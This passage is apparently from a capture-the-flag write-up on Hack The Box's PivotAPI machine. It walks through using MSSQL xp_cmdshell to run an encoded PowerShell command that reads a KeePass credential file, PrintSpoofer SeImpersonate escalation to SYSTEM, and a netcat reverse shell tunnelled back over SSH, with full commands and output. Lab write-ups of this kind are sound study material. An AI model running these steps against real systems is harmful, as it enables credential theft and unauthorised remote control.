Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: Español
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió el contexto de la base de datos a 'master'.
[*] INFO(PIVOTAPI\SQLEXPRESS): Line 1: Se cambió la configuración de idioma a Español.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> exec xp_cmdshell 'powershell -e "JAB1AHMAZQByAD0AJwBMAGkAYwBvAHIARABlAEIAZQBsAGwAbwB0AGEALgBoAHQAYgBcAHMAdgBjAF8AbQBzAHMAcQBsACcACgAKACQAcABhAHMAcwAgAD0AIABDAG8AbgB2AGUAcgB0AFQAbwAtAFMAZQBjAHUAcgBlAFMAdAByAGkAbgBnACAAJwAjAG0AcwBzAHEAbABfAHMAMwByAFYAMQBjADMAIQAyADAAMgAwACcAIAAtAEEAcwBQAGwAYQBpAG4AVABlAHgAdAAgAC0ARgBvAHIAYwBlAAoACgAkAGMAcgBlAGQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAFMAQwByAGUAZABlAG4AdABpAGEAbAAoACQAdQBzAGUAcgAsACAAJABwAGEAcwBzACkACgB0AHIAeQAgAHsAIAAKACAAIABJAG4AdgBvAGsAZQAtAEMAbwBtAG0AYQBuAGQAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgAHsAIABbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAWwBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJwBjADoAXAB1AHMAZQByAHMAXABzAHYAYwBfAG0AcwBzAHEAbABcAGQAZQBzAGsAdABvAHAAXABjAHIAZQBkAGUAbgB0AGkAYQBsAHMALgBrAGQAYgB4ACcAKQApACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAEMAOgBcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcADAAeABkAGYALgB0AHgAdAAgAH0AIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAUABpAHYAbwB0AEEAUABJACAALQBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJABjAHIAZQBkACAACgB9ACAAYwBhAHQAYwBoACAAewAgAAoAIAAgAGUAYwBoAG8AIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUACgB9AA=="'
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   

#< CLIXML <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><Obj S="progress" RefId="0"><TN RefId="0"><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparando módulos para el primer uso.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="1"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparando módulos para el primer uso.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S="progress" RefId="2"><TNRef RefId="0" /><MS><I64 N="SourceId">1</I64><PR N="Record"><AV>Preparando módulos para el primer uso.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>  

```

The file is now there:

```

SQL> exec xp_cmdshell 'type \programdata\0xdf.txt'
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
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
NULL   

```

Decoding that base64 by saving it to a file and using `base64` provides the KeePass DB:

```

oxdf@parrot$ base64 -d output.b64 > /tmp/output
oxdf@parrot$ file output
output: Keepass password database 2.x KDBX

```

Obviously there’d be some enumeration to figure out that file existed, but that is all do-able as well.

### Shortcut #2

From the same place as the first shortcut where I have access to the MSSQL database but no other foothold, I can abuse the privileges assigned to the service hosting MSSQL to get execution as SYSTEM. I can do this with a standard MSSQL client, like `mssqlclient.py`. The process is running with `SeImpersonatePrivileges`, as is typical for Windows services:

```

SQL> exec xp_cmdshell 'whoami /priv'
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
NULL
INFORMACIÓN DE PRIVILEGIOS
--------------------------
NULL

Nombre de privilegio          Descripción                                       Estado
============================= ================================================= =============
SeAssignPrimaryTokenPrivilege Reemplazar un símbolo (token) de nivel de proceso Deshabilitado
SeIncreaseQuotaPrivilege      Ajustar las cuotas de la memoria para un proceso  Deshabilitado
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio          Deshabilitado
SeChangeNotifyPrivilege       Omitir comprobación de recorrido                  Habilitada
SeManageVolumePrivilege       Realizar tareas de mantenimiento del volumen      Habilitada
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticación      Habilitada
SeCreateGlobalPrivilege       Crear objetos globales                            Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso      Deshabilitado
NULL

```

For a modern system, I’ve shown before [RoguePotato](https://github.com/antonioCoco/RoguePotato), but that requires outbound connection on TCP 135, and I’ve already seen that all outbound connections are blocked at the firewall. There’s an alternative vector that uses the print spooler to get a connection from a system process and impersonate it. [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) and [SweetPotato](https://github.com/CCob/SweetPotato) both are implementations of this.

I can use the Alamot MSSQL shell to upload the PrintSpoofer binary to PivotAPI. Now from the `mssqlclient` window, I can run commands as the machine account:

```

SQL> exec xp_cmdshell 'c:\programdata\PrintSpoofer64.exe -c "cmd /c whoami >\programdata\output"'
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
NULL
SQL> exec xp_cmdshell 'type \programdata\output"'
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
licordebellota\pivotapi$
NULL  

```

This same idea will fetch the flag:

```

SQL> exec xp_cmdshell 'c:\programdata\PrintSpoofer64.exe -c "cmd /c type C:\users\cybervaca\desktop\root.txt  >\programdata\output"'
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
NULL
SQL> exec xp_cmdshell 'type \programdata\output"'
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
b32c5e3e************************ 

```

I believe it’s possible to start `nc` listening with something like `nc64.exe -lnvp 4444 -e cmd.exe` and then connect to it and get a shell, but I wasn’t able to get that connection working. Still, a couple steps later, when I have SSH access, I can do this connect with `-R 9999:127.0.0.1:9999`. That will open a listener on PivotAPI TCP 9999, and forward anything back to port 9999 on my local host.

Now I can upload `nc64.exe` to the host and run the PrintSpoofer exploit with a reverse shell that calls to localhost:

```

SQL> exec xp_cmdshell 'c:\programdata\PrintSpoofer64.exe -c "c:\programdata\nc64.exe 127.0.0.1 9999 -e cmd"'
output
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
NULL

```

At `nc` on my host:

```

oxdf@parrot$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 37126
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32>whoami
licordebellota\pivotapi$

```

This technique was [patched on 27 May 2021](https://app.hackthebox.com/machines/pivotapi/changelog) by HackTheBox by disabling the Print Spooler service. Still there are other ways around this that abuse `SEImpersonate` without using the Print Spooler.

[More Unintendeds »](/2021/11/08/htb-pivotapi-more.html)